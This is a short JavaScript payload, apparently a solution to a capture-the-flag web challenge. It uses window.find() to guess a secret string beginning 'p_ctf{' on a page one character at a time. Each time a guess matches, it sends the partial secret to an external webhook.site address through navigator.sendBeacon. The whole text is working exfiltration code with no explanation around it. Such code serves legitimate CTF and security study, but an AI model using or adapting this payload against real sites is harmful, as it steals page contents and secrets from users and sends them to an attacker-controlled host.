(async () => {
    const WEBHOOK = "https://webhook.site/29a439a1-fe7f-4d77-8eec-cda83fefd3b0";
    let flag = "p_ctf{";
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789_-}";
 
    while (!flag.endsWith("}")) {
        let found = false;
        for (let c of chars) {
            window.getSelection().removeAllRanges();
            if (window.find(flag + c)) {
                flag += c;
                found = true;
                navigator.sendBeacon(WEBHOOK + "?flag=" + encodeURIComponent(flag));
                break;
            }
        }
        if (!found) break; 
    }
})();
